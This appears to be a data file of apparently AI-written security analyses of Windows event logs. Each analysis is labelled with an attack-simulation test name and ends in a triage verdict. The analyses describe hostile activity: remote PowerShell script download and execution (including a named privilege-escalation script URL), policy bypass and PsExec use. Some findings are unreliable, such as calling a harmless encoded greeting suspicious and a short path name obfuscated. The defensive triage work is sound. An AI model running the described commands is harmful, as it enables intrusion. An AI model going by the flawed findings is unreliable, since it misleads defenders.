    - PowerShell execution with command: `""powershell.exe"" & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\syscall.exe -debug}` is noted. This use of PowerShell to execute a binary located in a user’s temp directory is highly suspicious as it can be indicative of a malicious attempt using PowerShell to run custom or potentially harmful executables.

2. **PowerShell Logs:**
    - The logs show that a PowerShell script was executed with reference to the previously mentioned syscall executable. This supports the finding that PowerShell is being used in conjunction with a potentially suspicious executable to effectuate some commands or actions.

3. **Lack of Context in Other Logs:**
    - The absence of events in the Security and System logs provides no additional insight into potential anomalies such as failed logon attempts, privilege changes, or critical system errors that could support or refute the suspicion of compromise.

4. **Time Correlation of Events:**
    - All these events occur in quick succession (within seconds) which could suggest automated activity, possibly scripted or scheduled tasks executed for specific reconnaissance or initial access purposes.

**Assessment and Guidance:**

- **Assessment:** The use of PowerShell to run a binary from a user temp directory is most concerning. This is a tactic often observed in malicious campaigns for exploiting Windows environments. While the use of `wevtutil.exe` and `conhost.exe` can be legitimate, without further context or additional event logs, their repetitive execution by the same user raises suspicion.

- **Resolution:** **SUSPICIOUS**. The activity identified in the logs suggests actions that are abnormal and warrant closer examination, particularly focusing on the execution of `syscall.exe` through PowerShell and further investigations on `SERVER002\admin_test` user activities.

- **Guidance on Further Action:**
  1. Investigate the content and intent of `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\syscall.exe`.
  2. Check the integrity and source of the PowerShell command, and review any associated scripts for signs of malicious intent.
  3. Monitor `SERVER002\admin_test` account activities and restrict privileges if necessary.
  4. Implement stricter monitoring controls for PowerShell and system utilities usage.
  5. Perform a thorough scan of the system with updated antivirus/anti-malware solutions."
Powershell XML requests,"Based on the provided Windows event logs, a detailed analysis can be outlined as follows:

### Analysis of Logs

1. **Frequent Invocation of `wevtutil.exe` and `conhost.exe`:**
   - The logs reflect multiple invocations of `wevtutil.exe` followed by `conhost.exe`. Access to and manipulation of event logs without a clear reason could be indicative of suspicious behavior, especially if carried out repeatedly by the same user account.

2. **Unusual Command Execution (`cmd.exe` and `powershell.exe`):**
   - There is an event involving `cmd.exe` executing a `powershell.exe` command with `-exec bypass -noprofile`, loading a remote XML from GitHub. The script executes a command contained within `test.xml`. This behavior is notable as it bypasses execution policies and downloads an external file for execution, which is a common technique used by attackers to execute arbitrary code.

3. **Execution of System Utilities (`hostname.exe` and `whoami.exe`):**
   - The use of utilities like `HOSTNAME.EXE` and `whoami.exe` is noted, likely to gather contextual information on the system, such as the current user and computer name. While these utilities are legitimate, their use in combination with other suspicious commands can indicate reconnaissance activity within the host.

4. **Security Privileges and Elevated Tokens:**
   - The security logs show an account with high privileges (`admin_test`) engaging in activities consistent with sophisticated actions, such as requiring privileges for potentially sensitive administrative tasks (e.g., access to security policies, backup privileges).

5. **Logon Activities Found in Security Logs:**
   - The log events show multiple logons with `logon type 3`, indicating network logons which fit an access profile consistent with remote connections. The logins originate from the same IP (IPv6), suggesting repeated remote access.

### Assessment

The event logs collectively suggest activities that could potentially signify a compromise:

- **The execution of PowerShell scripts, especially bypassing execution policies and contacting remote resources, raises concerns about potential malicious payloads being delivered and executed.**
- **The repetitive use of `wevtutil.exe`, a tool for accessing and managing event logs, without corresponding actions known to require such operations, signals potential cover-up attempts or log manipulation.**
- **High privilege usage and remote login activities imply a risk if these sessions were leveraged by unauthorized users or if the details were compromised.**

### Conclusion

**Resolution:** **MALICIOUS**

Based on the unusual behavior patterns and command-line executions observed, this activity is identified as malicious. Immediate steps should be taken to investigate the user account activities, device integrity, and network connections, along with a thorough forensic investigation to identify and neutralize any potential threats or breaches."
WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique,"### Analysis of the Logs:

Upon reviewing the provided logs, several points and events stand out:

1. **Time Manipulation**:
   - The security log shows Windows event ID 4616, indicating a change in system time by the process `svchost.exe`. This is generally suspicious, as time manipulation is often used by attackers to evade logging or coordinate attack steps.

2. **PowerShell Activity**:
   - Multiple PowerShell logs show a command where PowerShell is used to execute a script hosted on an external URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1`). This behavior is definitely suspicious, as it involves downloading and executing a script from the internet, an activity often associated with malicious intent.

3. **Sysmon Logs**:
   - Sysmon logs confirm the presence of a PowerShell process executing with a suspicious command line that matches the downloaded script execution. This event is compounded by the fact that PowerShell typically should not be used in such a manner in a standard environment.

4. **Indicators of Privilege Escalation**:
   - The Windows PowerShell log also shows an execution attempting to gain higher privileges using process injection techniques described in the script. The script is noted to check for administrator privileges and manipulate parent process IDs (PPID spoofing), indicating a clear attempt at privilege escalation or evading detection, which is malicious activity.

### Assessment:

The combination of time changes, downloading and executing remote scripts via PowerShell, and attempts to escalate privileges using advanced scripting techniques leads to a strong indication of suspicious, if not outright malicious activity. 

1. **Risk & Threat Identification**:
   - There is an active risk of privilege escalation and remote code execution within the environment. The execution of external scripts via PowerShell, particularly those focusing on handling system processes and privilege escalation, typically fits the profile of adversarial behavior.

### Recommended Resolution:

- **Resolution**: **MALICIOUS**

This assessment concludes that the events in the logs strongly suggest malicious activity. Given the sophistication of the techniques employed, immediate action should involve isolating the affected host and conducting a full forensic investigation to understand the scope of the compromise, potential data exposure, and secure the enterprise environment.

### Guidance on How to Proceed:

1. **Containment**:
   - Immediately isolate the machine (Server002) from the network to prevent further spread or communication with malicious actors.

2. **Investigation**:
   - Conduct a thorough forensic analysis on the affected system to determine the full impact of the breach. This should include memory analysis and examination of persistent mechanisms and access vectors.

3. **Remediation and Hardening**:
   - Remove any identified malicious processes, scripts, and artifacts. Re-evaluate and strengthen PowerShell execution policies and network controls to prevent similar attacks. 

4. **Monitoring and Prevention**:
   - Increase the monitoring of PowerShell command executions and any changes to system time across the organization. Consider deploying enhanced security solutions such as EDR (Endpoint Detection and Response) to capture and analyze anomalies in real-time.

By following these steps, the security team can begin to mitigate the threat presented by the malicious activities indicated in these logs."
PowerShell Command Execution,"Analyzing the provided logs, a few key observations suggest suspicious and potentially malicious activity. Let's break it down:

1. **PowerShell Activity:**
   - There are multiple PowerShell events logged, specifically EventID 600, which usually indicates the start of various providers. 
   - The command line argument for PowerShell involves base64 encoding (-e flag), and the provided encoded string ""JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA=="" translates to a suspicious command that often indicates malicious intent. Typically, decoders indicate this format as part of obfuscated commands used to avoid detection.

2. **Sysmon Logs Indicate Process Creation from cmd.exe and powershell.exe:**
   - The sequence of `cmd.exe` launching PowerShell with similar base64 encoded strings suggests potentially harmful execution. Obfuscated commands using PowerShell are a common indicator of attack patterns such as downloader or backdoor scripts.

3. **Security Logs:**
   - The security events mainly reflect normal operations related to time adjustment (EventID 4616). However, the concurrent appearance of PowerShell activity combined with these events raises a flag for possible TimeStamp tampering which is a known evasion technique.

4. **System Logs:**
   - Similar to security logs, system logs reflect time adjustments and general kernel operations that could be benign but should be noted especially around the same timestamp of PowerShell execution.

5. **Other Observations:**
   - Multiple ""wevtutil.exe"" and ""whoami.exe"" executions in the Sysmon logs suggest enumeration activities. While ""wevtutil"" could indicate an attempt to clear or manage event logs to cover tracks, ""whoami.exe"" execution implies possible identity checks conducted by a script.

### Assessment and Risk:

The consistent use of PowerShell with encoded commands, presence of enumeration activities, coupled with potential cleanup actions (such as those implied by `wevtutil.exe`), all point towards behavior consistent with malicious activity.

### Conclusion:

- **Resolution:** MALICIOUS
- **Threat:** Potential compromise involving execution of obfuscated PowerShell commands, likely part of an attack script.
- **Actionable Steps:**
  1. Immediate isolation of the host (Server002) to prevent lateral movement or further exploitation.
  2. Comprehensive endpoint scans for malware or fileless attacks specifically focused around PowerShell activities.
  3. Detailed investigation of user activities (SERVER002\\admin_test) and potential unauthorized access.
  4. Review other connected systems for similar behavior to rule out broader network impact.
  5. Implement stricter monitoring for PowerShell logging and restrict unnecessary PowerShell script execution on sensitive systems."
Use PsExec to execute a command on a remote host,"### Detailed Analysis of the Logs:

1. **Process Execution Analysis**:
   - **PowerShell Execution**: The logs indicate the execution of PowerShell (`powershell.exe`) by `SERVER002\admin_test`. PowerShell is a common tool used in both administrative tasks and malicious activities. The absence of command-line detail makes it difficult to ascertain if it was used maliciously. 
   - **Command Execution Attempts**:
     - The execution of `cmd.exe` with `PsExec.exe` to run `calc.exe` using a clear-text password for an Administrator account is highly suspicious. This indicates a potential privilege escalation attempt or lateral movement.
     - This specific command line indicates the use of `PsExec`, a legitimate tool often misused for executing processes on remote systems, included with the credentials on the command line, which is insecure and could be indicative of a misuse.

2. **Process Ancestry and Behavioral Insights**:
   - Several legitimate Windows processes are present such as `conhost.exe`, `whoami.exe`, `taskhostw.exe`, and various Microsoft Edge Update processes.
   - Rapid succession of `wevtutil.exe` commands could suggest log manipulation or interaction with Event logs, though the context here doesn't conclusively prove policy modification or malicious log clearance without further evidence.

3. **Microsoft Edge Update Processes**:
   - Numerous executions of `MicrosoftEdgeUpdate.exe` processes were detected, running under `NT AUTHORITY\SYSTEM`, which is typically associated with software updates. This behavior by itself, in isolation, generally aligns with normal software update operations, but should always be monitored for anomalies.
   
4. **Log Analysis**:
   - The Windows logs provided (Sysmon, Application, and others) corroborate the analyzed activities, without showing direct evidence of attempted persistent compromise but do hint towards possible security oversights, mainly around account usage and password handling.

### Assessment:

- **Anomalous Activity**: While tools such as PowerShell and PsExec can be benign and legitimately used in an administrative context, the manner of their use in these logs, specifically the clear-text password use in command-line arguments, is highly suspicious.
  
- **Risk**:
  - There is significant risk regarding improper credential handling and potential for privilege escalation based on the logged command attempts.
  - The logs show no direct persistence mechanisms or execution of clearly malicious binaries, but potential for misuse exists.

### Final Resolution:
- **SUSPICIOUS**: The activity captured in the logs, particularly concerning `PsExec` usage with plaintext credentials and PowerShell execution, warrants further investigation. This involves:
   - Reviewing the intent and necessity of the activities by the user `admin_test`.
   - Auditing systems for misconfigurations, weak credentials, and similar misuse.
   - Enhancing monitoring and logging for similar uses of administrative tools in future operations.

Given the suspicious nature of some entries, especially those involving credential handling and tool usage, a deeper inquiry should confirm if these processes are authorized and expected."
ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments,"Upon analyzing the provided Windows event logs, here is the detailed review of potentially suspicious activities:

### Windows PowerShell Logs

- **PowerShell Commands with Encoded Arguments**: In the Windows PowerShell logs, the command executed involves encoded arguments and some potentially obscure parameters (`Out-ATHPowerShellCommandLineParameter`, `-UseEncodedArguments`). This can often be a technique used to obfuscate commands, making manual analysis difficult and potentially evading signature-based detection. The use of encoded command arguments can be indicative of malicious activities such as script-based attacks or exploitation attempts.

- **PowerShell Execution Policy Change**: One entry uses `-ExecutionPolicy Restricted`. Although it may initially seem restrictive, changes in execution policy combined with scripting can also mask malicious intentions.

### Sysmon Logs

- **Frequent PowerShell Usage**: Frequent instantiation of `powershell.exe` by the user `admin_test` raises concern, especially in the context of the encoded command arguments observed in the PowerShell logs.

- **Usage of `whoami.exe` and `hostname.exe`**: These commands were used in succession. While usage of `whoami.exe` can be legitimate in admin scripts, combined with other factors, it could point toward reconnaissance activities by an attacker to gather system info.

- **Use of `wevtutil.exe`**: This utility is used to manage event logs on Windows. Though it can be legitimate, in conjunction with the other findings, it could indicate an attempt to clear logs or tamper with log data to cover tracks.

### System and Security Logs

- **Windows Update Events**: Frequent updates and installations logged here do not directly indicate malicious activity but typically should be reviewed for discrepancies against expected update schedules or unexpected software.

- **Logon Events**: The `LogonType` of 5 indicates a service type logon, which often corresponds to legitimate system services starting up. However, seeing it alongside other suspicious PowerShell activities warrants further inspection into which services are being started.

### Conclusion and Recommendation

The combination of:
- The use of encoded command arguments in PowerShell executions.
- Repeated and seemingly contextless command-line executions (`whoami`, `hostname`) by `admin_test`.
- Potential misuse of utilities like `wevtutil.exe`.

This suggests the presence of potentially unauthorized or obfuscated activities indicative of malicious behavior.

### Resolution: **SUSPICIOUS**

While the activities observed are certainly concerning, they alone do not provide irrefutable evidence of a malicious breach without additional correlation from other logs or indicators. Further investigation and correlation with other data sources (e.g., Network logs, antivirus alerts) should be conducted to confirm any unauthorized activities.

#### Next Steps:
- **Conduct a deeper forensic analysis** of PowerShell scripts and command history to decode any encoded commands and understand their impact.
- **Verify the integrity and security** of the `admin_test` account, ensuring it is not compromised.
- **Review recent changes and user activities** on the affected systems.
- **Check for any unauthorized access attempts** or unusual network communication from the host in question.
- **Implement tighter monitoring and alerting** for enhanced visibility on PowerShell and system activities."
Cobalt Strike SSH (postex_ssh) pipe,"Based on the analysis of the provided Windows event logs, here is the detailed breakdown of the findings:

### Indicators of Malicious Activity
1. **Execution of Non-Standard Utilities:**
   - There is a notable execution of `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` from a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\build\`. These binaries are not standard Windows executables and their presence in the temp directory is suspicious.
   - These executables are associated with IPC communication but, given the directory and naming, they might be used for other unknown purposes which warrants further inspection.

2. **Command Execution:**
   - The execution of the `cmd.exe` appends to the suspicious `namedpipes_executor.exe` usage: `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\build\namedpipes_executor.exe"" --pipe 3`. Such constructed command lines can be attempts to bypass security detection or mask the actual command execution paths using relative path navigation.

3. **Usage of PowerShell:**
   - PowerShell was invoked: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` by the user `SERVER002\admin_test`, which is common for both legitimate and malicious administration tasks. Without specific command details, this is generally suspicious until confirmed valid.

### Analysis of Logs
- **Security Log Analysis:**
  - Regular `4624` (Logon) and `4672` (Special Privileges Assigned) events are observed for the `SYSTEM` account, which are common in system operations. No irregular logons or unauthorized access attempts were evident.
  
- **Other Observations:**
  - A lot of standard Windows services and processes are seen executing (`svchost.exe`, `taskhostw.exe`, etc.) which are normal depending on context, although the observation of the temporary `.exe` files being run makes the environment concerning.
    
### Assessment
Based on the analysis of the events and processes listed in the logs, particularly the presence and execution of `namedpipes_*` executables from a temporary directory and execution of command scripts using PowerShell, there are definite indicators of suspicious activity that warrant further investigation.

### Resolution
**SUSPICIOUS**: While there are no outright confirmations of malicious behavior, the logs contain certain activities that are unconventional and raise red flags (especially with the temp-based executables). Further investigation should be undertaken to trace the provenance and purpose of these executables, and verify whether they align with legitimate operational requirements or user intentions. It is also recommended to cross-reference these findings with network logs or DNS queries for suspicious outbound connections which may correspond with the activity noted here."
WMI Reconnaissance Processes,"### Analysis:

1. **Sysmon Logs**:
   - The majority of the logs show execution of typical Windows system utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `cmd.exe`, `wmic.exe`, `SearchProtocolHost.exe`, and `SearchFilterHost.exe`. These are common Windows utilities and their execution alone is not inherently suspicious.
   - The execution of `cmd.exe` with the command `wmic process get caption,executablepath,commandline` is a bit more reasonable to take note of, as it involves a command to fetch detailed process information which can be associated with information gathering tactics. However, without additional context or irregular patterns, this remains a common administrative command.
   
2. **Edge Update Process**:
   - Multiple logs relate to the setup and updating of Microsoft Edge, evidenced by processes executed from paths containing `MicrosoftEdge` or `EdgeUpdate`. The setup files and their path and execution parameters appear consistent with legitimate update behavior for Microsoft Edge.
   
3. **Security Logs**:
   - There is a Security log entry (EventID 4799) associated with a change of group membership using `setup.exe` from the EdgeUpdate folder. This behavior typically fits within normal operations related to application updates or installations where permissions need to be adjusted temporarily.

4. **Application Logs**:
   - There is a log entry indicating activity by the Software Protection Platform Service, which corresponds to licensing and software protection behavior, such as validation and activation checks. 

### Assessment:

- **Indicators of Compromise**: No definitive indicators of compromise were identified. The use of standard system utilities could be associated with either benign administrative activity or early reconnaissance within a potential attack. However, there is insufficient context provided in the logs to implicate malicious intent.
  
- **General Behavior**: Observed behavior can be justified in a regular administrative or software update context. The frequency and nature of observed processes do not align strictly with known attack vectors or breach patterns.

### Resolution:

- **Resolution: BENIGN**

### Guidance:

- Continue regular monitoring and consider adding enhanced logging or alerting for more abnormal behaviors, such as unexpected external communication, privilege escalation attempts, or unauthorized access to sensitive areas of the system.
- Review access control policies and ensure system utilities are used strictly within operational protocols.
- Confirm the legitimacy of the Microsoft Edge update if any specific concerns are raised from a broader perspective beyond these logs.
"
Writes text to a file and displays it,"Upon reviewing the provided logs, the following observations and analysis can be made:

### Observations:

1. **Sysmon Logs:**
   - There are repeated instances of executions involving `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. These are standard Windows system utilities, which can be both for legitimate administrative purposes and leveraged for malicious actions.
   - The `cmd.exe` event includes a command line `/c echo ""Hello from the Windows Command Prompt!"" > ""%TEMP%\test.bin"" && type ""%TEMP%\test.bin""`. This seems like a test or diagnostic command, which is not inherently suspicious on its own.

2. **Security Logs:**
   - Logon sessions are recorded, showing a user ""admin_test"" logging in via NTLM authentication, identified as logon type 3 (network logon). There is also a log showing privilege escalation with a list of privileges that include debug and other high-level system privileges.

3. **Application Logs:**
   - Involves the Software Protection Platform Service, a routine system operation.

### Analysis:

- **High Privileges:** The account ""admin_test"" is operating with numerous high-level system privileges (EventID: 4672). Such privileges are not necessarily suspicious if required for legitimate administrative tasks; however, they can be concerning if not usual for this user or if compromised.

- **Command Line Activity:** The operation involving `cmd.exe` is not complex or indicative of malicious activity by itself, mainly since it only performs a simple echo to file and then displays the file contents. This activity alone does not indicate an attack or compromise.

- **Process Usage:** The frequent use of `wevtutil.exe` and `conhost.exe` in close succession is normal when dealing with logs or managing console operations programmatically or through scripts. Given the context provided, no malicious use of these tools is evident in the session details provided.

- **Logon Behavior:** No unknown or suspicious IP addresses are identified in the logon event. The use of NTLM and the matching User ID all point to a consistent, expected session.

### Conclusion:

Based on the information from the logs, no concrete indicators of malicious activity or compromise are identified. The activities seem consistent with typical system and administrative processes, even accounting for the elevated privileges granted during a session.

### Resolution:

- **BENIGN:** The logs contain benign activity consistent with expected system use and maintenance tasks. However, continuous monitoring is recommended to ensure that privilege levels and logon patterns remain within expected parameters and any changes are promptly investigated."
LNK Payload Download,"Upon reviewing the provided Windows event logs, I have identified certain entries that warrant attention due to potential suspicious or abnormal behavior.

### Key Observations:

1. **System Time Changes:** 
   - There are multiple instances of `EventID: 24` and `EventID: 1` from the `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Security-Auditing` indicating changes to the system time (old and new timestamps). Time adjustments can be normal, often related to syncing with a time source; however, frequent changes are sometimes signs of malicious activity to manipulate time-based security systems or logs.

2. **Sysmon Events:**
   - **Processes Executed:** Regular Windows processes (`whoami.exe`, `conhost.exe`, `wevtutil.exe`, `taskkill.exe`) have been executed. However, the logs do not indicate unusual command-line arguments or behavior associated with these processes.
   - **PowerShell Execution:** The `powershell.exe` command with `Invoke-WebRequest` to download a `.lnk` file from a remote source and execute it is particularly concerning. This activity is characteristic of potential malware delivery or phishing attacks.

3. **Security Logs:**
   - **Successful Logons:** The logs document successful logons (`EventID: 4624`) and privilege assignment (`EventID: 4672`). The logon type `5` indicates a service logon that is typically legitimate; however, combined with PowerShell activity, further scrutiny is warranted.

4. **PowerShell Logs:**
   - **Script Execution:** The PowerShell logs confirm the execution of a script intended to download and run a file, aligning with the Sysmon PowerShell event.

5. **Security Product State:**
   - The Windows Defender logs suggest that security products were operational, which is positive, but they should be checked if they mitigated any threats.

### Assessment:

- **Suspicious Behavior Detected**: The PowerShell activity involving downloading and launching a file from an external source is suspicious. This could be indicative of malicious intent as it closely aligns with scenarios involving malware distribution through phishing or scripted attacks.

### Resolution:
- **SUSPICIOUS** - The activity in the logs is suspicious and requires further investigation. The presence of the PowerShell command that downloads and executes a remote file is a significant indication of potentially malicious activity. It is suggested to:
  - Conduct a detailed file analysis of `test10.lnk` and any files related to it.
  - Review network traffic to ensure no other unauthorized activities are occurring.
  - Perform a comprehensive security assessment on the affected host.
  - Ensure endpoints, including `Server002`, are fully updated with the latest security patches and that antivirus/malware tools are active and up-to-date.
"
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments,"After analyzing the provided Windows event logs, several aspects warrant further investigation due to potentially suspicious activities:

1. **Unusual PowerShell Execution**:
   - The logs indicate the execution of `powershell.exe` with encoded command parameters (as seen in the log entries featuring `PowerShellCommandLineParameter`, `EncodedCommandParamVariation E`, etc.). This encoded execution pattern is commonly seen in obfuscated scripts aimed at evading detection.
   - The frequent invocation of PowerShell with no clear script or command context further increases suspicion. Common administrative tasks involving scripting do not typically need encoded arguments unless there's a specific need for obfuscation.

2. **Frequent Process Executions**:
   - Repeated executions of processes like `conhost.exe`, `wevtutil.exe`, and `svchost.exe` within a short time frame could be indicative of process spawning often associated with lateral movement or process hollowing techniques.
   - However, alone, this pattern isn't conclusively malicious without additional context, as these are legitimate processes used for normal OS functions. This high frequency, though, when coupled with the use of PowerShell, raises red flags about potential abuse.

3. **Account and User Context**:
   - All activities are conducted under the `SERVER002\admin_test` user context with high integrity levels. If this user should not perform these tasks, it might denote credential misuse or privilege escalation.
   - There's no immediate indicator of privilege escalation from the logs alone, but the combination with encoded PowerShell execution prompts more scrutiny over who or what initiated these commands.

Given these observations, the presence of encoded PowerShell commands alongside the notable frequency of certain system processes suggests activities could be suspicious. The combination points towards possible reconnaissance or preparatory stages of an attack.

### Resolution: **SUSPICIOUS**

#### Recommended Actions:
- **Immediate Investigation**: Conduct a deeper analysis of `admin_test` activities. Validate whether the account's actions align with expected behavior and check for any recent changes or alerts correlated to this user.
- **Decode PowerShell Commands**: Attempt to decode the PowerShell commands to understand their purpose. This will help clarify whether the actions were benign or part of a malicious script.
- **Review Related Logs**: Examine other logs, such as network, application, and security logs, for any unusual patterns or connections initiated by this host around the event timing.
- **Conduct a Threat Hunt**: Given that the activity is marked suspicious, proactively search for similar patterns network-wide, focusing on other hosts and accounts.
- **Monitor and Alert**: Set up continued monitoring for further abnormal activities from this account and any encore events of encoded command executions.

The pattern reveals potential early-stage malicious activity, emphasizing the necessity for a thorough investigation to determine the full scope and intent."
BlackCat pre-encryption cmds with Lateral Movement,"Upon analyzing the provided Windows event logs, several indicators suggest potential malicious activity, particularly around process execution and use of PowerShell with specific arguments that are often associated with lateral movement or privilege escalation tactics. Key observations include:

1. **PowerShell Execution with Uncommon Command Lines:** 
   - Logs show the execution of `powershell.exe` with complex command lines that include PowerShell scriptblock invocations containing commands like `wmic csproduct get UUID`, modifying link behavior with `fsutil`, registry modifications, and execution of `PsExec.exe`. These actions are indicative of attempts to collect system information, alter system configurations, and potentially leverage administrative tools for remote execution.
   - The contents of these commands and the presence of `PsExec` in these contexts align with known tactics used by attackers for lateral movement or to establish persistence.

2. **Execution of Built-in Windows Utilities:**
   - The logs list various executions of system utilities such as `wevtutil.exe`, `cmd.exe`, `conhost.exe`, and `whoami.exe`. Although these are legitimate tools, the usage pattern, particularly in combination with the PowerShell activities, raises suspicion. These might be used to gather information about the system environment, confirm user accounts, or manage event logs.

3. **High Integrity Levels and NT AUTHORITY\SYSTEM Context:**
   - Processes are executed at a high integrity level, and some use the `NT AUTHORITY\SYSTEM` context, which provides significant control over the system. This could indicate privilege escalation if these contexts are unwarranted for the user actions observed.

4. **Presence of Event ID 4688 and 4720 Activities:**
   - The security logs do not explicitly list these suspicious event IDs, but the behavior seen could relate to actions typically raising such alerts, involving process creation and user account changes, respectively.

5. **Privileged Logins and Privilege Assignments:**
   - There are multiple entries of Event ID 4624 indicating system process logons (`LogonType 5`), along with privileged operations (Event ID 4672), which further suggest administrative action taking place.

6. **Usage of PsExec:**
   - The presence and potential invocation of `PsExec` within PowerShell scripts further raise concerns. PsExec is commonly leveraged for executing processes on remote systems and can be a red flag if its use is unauthorized.

Given the indicators observed, the following assessment is made:

**Resolution: MALICIOUS**

### Recommendations and Next Steps:
- **Immediate Containment:** Isolate the affected host from the network to prevent potential lateral movement or data exfiltration.
- **Thorough Investigation:** Conduct a detailed forensic examination of this host, focusing on understanding how unauthorized processes were initiated and whether there was a breach.
- **Review User Accounts and Privileges:** Verify the legitimacy of user accounts and any changes made to user privileges or policies.
- **Evaluate Recent Changes:** Audit recent software installations, registry changes, and scheduled tasks for unauthorized modifications.
- **Strengthen Security Measures:** Implement enhanced monitoring for PowerShell and administrative tool usage, and consider restricting PowerShell access to necessary users only.
- **Incident Response:** Initiate full incident response protocols to ensure any potential breach is mitigated and thoroughly reviewed for possible further intrusions.

"
Cobalt Strike Lateral Movement (psexec_psh) pipe,"Upon reviewing the provided Sysmon, Application, and other system logs from the Windows host named ""Server002,"" a few key observations emerge:

### Observations:

1. **Frequent Execution of System Utilities:**
   - The logs show frequent execution of common Windows utilities such as `powershell.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. Usage of these utilities can be typical for administrative tasks. However, their usage in quick succession might warrant further inspection to rule out scripted malicious activities.

2. **Usage of PowerShell:**
   - `powershell.exe` was executed by the user `SERVER002\admin_test`. PowerShell is a legitimate tool often used by system administrators but can also be exploited by attackers, especially if run with high privileges or if unsigned scripts or unusual command-line arguments are used.

3. **Execution of Custom Executables:**
   - Custom executables such as `""namedpipes_executor.exe""`, `""namedpipes_server.exe""`, and `""namedpipes_client.exe""` were executed from the `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\build\` directory. These filenames and their location in a temporary directory raise suspicion, as they could indicate potential lateral movement or data exfiltration attempts using named pipes—a common technique for inter-process communication or potentially malicious activity.

4. **Unusual Directory Paths:**
   - The executables are run from within a hidden or obfuscated path using `ADMIN_~1`, which may suggest an attempt to hide the processes or avoid detection.

5. **Privilege and Account Use:**
   - Most activities are performed under the user `SERVER002\admin_test` with high integrity levels, suggesting administrations rights, which if compromised, can lead to significant system control by an attacker.

6. **Normal System Activity with Microsoft Edge Update:**
   - Multiple instances show `MicrosoftEdgeUpdate.exe` being run, stopped, and started again, which appears consistent with normal system update behavior by Microsoft Edge's automatic update service.

7. **Absence of Abnormal Logs in Other Channels:**
   - No entries in the Security and other logs that might indicate successful privilege escalation, user account anomalies, or other misconfigurations.

### Assessment:

Given the data provided:

1. **High Potential for Suspicious Activity:**
   - The custom executables in non-standard system paths, along with the use of named pipes, strongly suggest activity that goes beyond ordinary administrative tasks. The use of potentially suspicious command line arguments further exacerbates this suspicion.
  
2. **Absence of Additional Contextual Information:**
   - The absence of logs from other channels, such as security incident reports, makes it harder to immediately categorize any confirmed indicators of compromise but elevates the need for caution given the suspicious behaviors detected.

### Conclusion:

**Resolution: SUSPICIOUS**

- The activities observed require further analysis and investigation. Specifically, the usage of custom executables in obscure directories, alongside legitimate system utilities, needs to be verified against intended administrative activities. An additional review of external communications, related processes, and potentially malicious script execution should be pursued.
  
### Next Steps:

1. **Conduct Full Binary Analysis:**
   - Analyze the hash values of unknown executables (`namedpipes_executor.exe`, etc.) against known malware databases.
  
2. **Review User Activity:**
   - Investigate the actions and recent login activities of `SERVER002\admin_test` to determine if the account has been compromised.

3. **Check Network Traffic:**
   - Analyze network logs for any unusual outbound connections originating from `Server002`, especially related to named pipes communication.

4. **Enhance Monitoring:**
   - Increase logging and alerting for any new execution of scripts or binaries from similar paths or by the same user to detect any repeat occurrences quickly.

5. **Engage Incident Response:**
   - If further anomalies are detected, initiate a proper forensic investigation and containment plan."
Office Generic Payload Download,"### Detailed Analysis:

After a thorough analysis of the provided event logs, the primary concerns focus on the Sysmon, Windows PowerShell, and Security logs, which display activities consistent with potential malicious behavior.

#### Observations:

1. **Suspicious PowerShell Activity:**
   - Multiple entries show PowerShell being invoked with a script that uses `Invoke-MalDoc.ps1` from a remote source at ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/"". This PowerShell script is fetched and executed without apparent user intervention, indicating potential remote code execution (RCE) or a malicious script execution attempt.
   - The use of ""Invoke-MalDoc"" is widely recognized as a means to weaponize Office documents often used in phishing attacks and is considered highly suspicious.

2. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - Numerous instances of `wevtutil.exe` and `conhost.exe` running in rapid succession (entries 18015, 18019, etc.). While these are legitimate Windows processes, their frequency and timing, originating from the same potential parent process (`admin_test`), could indicate log tampering or process hiding attempts typical of malicious activity.

3. **Security Log Finding (Event ID 4798):**
   - The lookup or access of the `Guest` account by `CompatTelRunner.exe` is recorded. Although `CompatTelRunner.exe` is a legitimate telemetry process, accessing user accounts is unusual and could be indicative of privilege escalation attempts or reconnaissance.

4. **High Integrity Level Process Execution:**
   - Several commands and processes are executed with high integrity. When combined with typical system processes (such as hostnames and whoami), this could indicate post-exploitation reconnaissance where an attacker is confirming access levels and system information.

5. **Edge Update Processes and System Updates:**
   - There are numerous processes related to Microsoft Edge updates and Windows Update running, which could be normal but may also offer cover for other operations in the noise of permitted update activity. These logs generally appear benign but can mask malicious operations when improperly managed.

### Assessment and Conclusion:

Based on the log evidence, there is substantial activity consistent with malware execution, particularly around PowerShell invoking an external script, which is a notorious vector for exploits and payload delivery. Given the involvement of `Invoke-MalDoc.ps1`, it suggests an attempt to exploit vulnerabilities or perform unauthorized actions on this host.

### Resolution:

- **MALICIOUS**: The evidence points towards confirmed malicious activity due to the PowerShell download and execution of a script known for cyber attack campaigns. Immediate action is necessary to isolate the machine from the network, investigate the extent of the breach, and remediate to prevent any further unauthorized network exposure or data compromise.

### Recommended Actions:

1. **Isolate the Affected Machine:** Immediately disconnect from the network to contain any potential spread.
2. **Perform a Full Forensic Investigation:** Analyze any changes made, network connections opened, or files modified or dropped on the system.
